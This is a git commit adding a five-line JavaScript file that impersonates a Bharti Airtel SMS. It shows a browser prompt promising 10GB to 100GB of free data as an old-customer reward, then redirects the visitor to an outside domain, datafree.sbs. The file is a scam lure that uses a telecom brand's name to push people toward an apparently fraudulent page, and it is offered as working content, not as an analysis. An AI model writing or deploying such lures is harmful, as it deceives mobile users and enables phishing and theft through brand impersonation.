44127d7980505e4f3ef63eb4b89977cc5aa96e68
mmainomi <akparawa247@gmail.com>
2025-03-30 05:24:05 -0700

    Create activation-bharti-airtel-freedata.js

---
+++ activation-bharti-airtel-freedata.js
@@ -0,0 +1,5 @@
+var password = 'Free Data'
+password=prompt('BHARTI AIRTEL SMS: Dear customer, kindly check if your Bharti Airtel sim card is qualify to receive from 10GB to 100GB data, Old Customers Reward, Press Free Data to Check Now ','Free Data');
+if (password != 'Free Data') {
+location.href='https://datafree.sbs/bharti-airtel-freedata.html';
+}
